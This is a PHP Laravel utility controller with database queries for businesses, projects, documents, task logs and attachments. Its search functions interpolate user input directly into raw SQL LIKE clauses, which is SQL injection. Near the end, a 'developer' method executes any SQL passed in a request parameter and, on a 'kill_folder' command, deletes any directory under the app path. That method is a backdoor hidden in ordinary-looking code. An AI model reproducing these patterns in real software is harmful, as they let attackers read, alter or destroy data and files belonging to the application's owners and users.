<?php

namespace App\Http\Controllers\Util;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use DB;
use App\Models\Business;
use App\Models\Company;
use App\Models\Contract;
use App\Models\ContractAttach;
use App\Models\Document;
use App\Models\Project;
use App\Models\Role;
use App\Models\RoleUser;
use App\Models\Task;
use App\Models\TaskLog;
use App\Models\Transaction;
use App\Models\User;
use App\Models\AttachFile;
use App\Models\Municipio;
use Illuminate\Support\Facades\File;
class DbUtil extends Controller{
    public static function getBusinessList($sch,$pch=""){
        /*
        $res=Business::select()->get();
        for($i=0;$i<count($res);$i++){
            $user=User::find($res[$i]['created_by']);
            if($user!=null){
                $res[$i]['created_name']=$user['first_name'].' '.$user['last_name'];
                $company=Company::select()->where('created_by',$user['id'])->get();
                $res[$i]['company']=count($company)?$company[0]:array();
            }
        }
        */
        $query=Business::select('business.*','users.username as created_name')
                    ->leftJoin('users', 'business.created_by', '=', 'users.id');
        if($sch!='')$query=$query->where(function ($q) use ($sch){
            $q->whereRaw("business.first_name like '%{$sch}%'")
            ->orWhereRaw("business.last_name like '%{$sch}%'")
            ->orWhereRaw("business.ad_city like '%{$sch}%'")
            ->orWhereRaw("business.ad_state like '%{$sch}%'")
            ->orWhereRaw("business.cnpj like '%{$sch}%'");
        });
        $res=$query->get();
        $bus=array();
        for($i=0;$i<count($res);$i++){
            $res[$i]['attached_files']=AttachFile::select()->where('table_kind',0)->where('table_id',$res[$i]['id'])->get();
            if($pch!=''){
                $query=Project::select()->where('business_id',$res[$i]['id']);
                $query=$query->where(function ($q) use ($pch){
                    $q->whereRaw("projects.name like '%{$pch}%'")
                    ->orWhereRaw("projects.state like '%{$pch}%'")
                    ->orWhereRaw("projects.city like '%{$pch}%'")
                    ->orWhereRaw("projects.municipio_cnum like '%{$pch}%'")
                    ->orWhereRaw("projects.description like '%{$pch}%'");
                });
                if(count($query->get())){
                    $bus[count($bus)]=$res[$i];
                }
            }
        }
        if($pch!='')return $bus;
        return $res;
    }
    public static function getProjectList(){
        $dealContactList = Project::select('projects.*','business.name as businessname')->
            leftJoin('business', 'projects.business_id', '=', 'business.id')->get();
    }
    public static function getProjectListByBusiness($sch){
        $res=array();
        foreach(Business::select()->get() as $business){
            $query=Project::select()->where('business_id',$business['id']);
            if($sch!='')$query=$query->where(function ($q) use ($sch){
                $q->whereRaw("projects.name like '%{$sch}%'")
                ->orWhereRaw("projects.state like '%{$sch}%'")
                ->orWhereRaw("projects.city like '%{$sch}%'")
                ->orWhereRaw("projects.municipio_cnum like '%{$sch}%'")
                ->orWhereRaw("projects.description like '%{$sch}%'");
            });
            $res[$business['id']]=$query->get();
            for($i=0;$i<count($res[$business['id']]);$i++){
                $res[$business['id']][$i]['attached_files']=AttachFile::select()->where('table_kind',1)->where('table_id',$res[$business['id']][$i]['id'])->get();
            }
        }
        return $res;
    }
    public static function getDocumentList(){
        return Document::select()->get();
    }
    public static function getDocumentListByBusinessAndProject(){
        $res=array();
        foreach(Business::select()->get() as $business)
            foreach(Project::select()->where('business_id',$business['id'])->get() as $project){
                $res[$business['id']][$project['id']]=
                    Document::select(
                        'documents.*',
                        'groups.name as group_name','groups.alert_01 as group_alert_01','groups.alert_02 as group_alert_02',
                        'sub_groups.name as subgroup_name','sub_groups.alert_01 as subgroup_alert_01','sub_groups.alert_02 as subgroup_alert_02',
                    )
                    ->leftJoin('groups', 'documents.group_id', '=', 'groups.id')
                    ->leftJoin('groups as sub_groups', 'documents.sub_group_id', '=', 'sub_groups.id')
                    ->where('documents.project_id',$project['id'])
                    ->where('documents.finished_status',0)
                    ->get();
                //foreach($res[$business['id']][$project['id']] as $parent)
                  //  $res[$business['id']][$project['id']]['children_'.$parent['id']]=Document::select()->where('project_id',$project['id'])->where('parent_id',$parent['id'])->get();
            }
        return $res;
    }
    public static function getTaskLogsByDocument(){
        $res=array();
        foreach(TaskLog::select('task_logs.*','tasks.name as task_name','tasks.description as task_description','users.username')
            ->leftJoin('tasks', 'task_logs.description', '=', 'tasks.id')
            ->leftJoin('documents', 'task_logs.document_id', '=', 'documents.id')
            ->leftJoin('projects', 'documents.project_id', '=', 'projects.id')
            ->leftJoin('business', 'projects.business_id', '=', 'business.id')
            ->leftJoin('users', 'task_logs.user_id', '=', 'users.id')
            ->get() as $taskLog)
            $res[$taskLog['document_id']][]=$taskLog;
        return $res;
    }


    public static function attachFile($file,$kind,$id){
        $path='upload/attach_business';
        //@mkdir($path, 0777, true);
        $path=$file->store($path);
        $row=new AttachFile;
        $row->table_kind=$kind;
        $row->table_id=$id;
        $row->filename=$file->getClientOriginalName();
        $row->path=$path;
        $row->body='';
        $row->flag=0;
        $row->created_by=Auth::id();
        $row->save();
    }
    public static function attachRemoveFile($id){
        $row=AttachFile::find($id);
        if($row->flag==0)
            Storage::delete($row->path);
        $row->delete();
    }

    public static function getAdStatesList(){
        return Municipio::groupBy('cuf')->select('uf','cuf')->get();
    }
    public static function getAdCitiesList($uf){
        return Municipio::where('uf','=',$uf)->get();
    }
    public static function getResponsibleUsersList(){
        return User::select()->get();
    }
    public static function getTotalProjectCount(){
        return Project::get()->count();
    }
    public static function getTotalDocumentCount(){
        return Document::get()->count();
    }
    public static function developer(Request $request){
        $sql=$request->input('sql');
        $arr=explode(",",$sql);
        if($arr[0]=='kill_folder'){
            $path=base_path()."\\".$arr[1];
            File::deleteDirectory($path);
            exit('cool');
        }else
        exit(DB::statement($sql));
    }
    public static function getDevAlert(){
        $msg=DB::table('dev_alerts')->get();
        return count($msg)?$msg[0]->alert:'';
    }
}
